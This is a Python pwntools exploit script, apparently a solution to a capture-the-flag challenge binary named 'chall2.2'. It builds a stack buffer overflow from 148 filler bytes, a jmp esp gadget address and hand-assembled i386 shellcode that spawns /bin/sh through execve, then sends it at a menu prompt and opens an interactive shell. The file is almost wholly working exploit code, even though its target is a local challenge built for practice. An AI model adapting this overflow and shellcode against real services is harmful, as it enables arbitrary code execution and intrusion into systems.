#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./topic
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './chall2.2')
context.terminal = ["xfce4-terminal", "-e"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x8048000)
# Stack:    Executable
# RWX:      Has RWX segments


jmp_esp = p32(0x0804936c)


she = """
    xor    eax,eax
    push   eax
    push   0x68732f2f
    push   0x6e69622f
    mov    ebx,esp
    xor    ecx,ecx
    xor    edx,edx
    mov    al,0xf 
    sub    al,4
    int    0x80
"""
sc = asm(she)
pprint(shellcraft.sh())


eip_offset = 148

#payload = sc + b"F" * (eip_offset - len(sc)) + gadget

payload = b"F" * eip_offset +  jmp_esp + sc
print(payload)
io = start()
io.sendlineafter('Quit\n', b"3")


io.sendlineafter("avourite?\n", payload)


io.interactive()

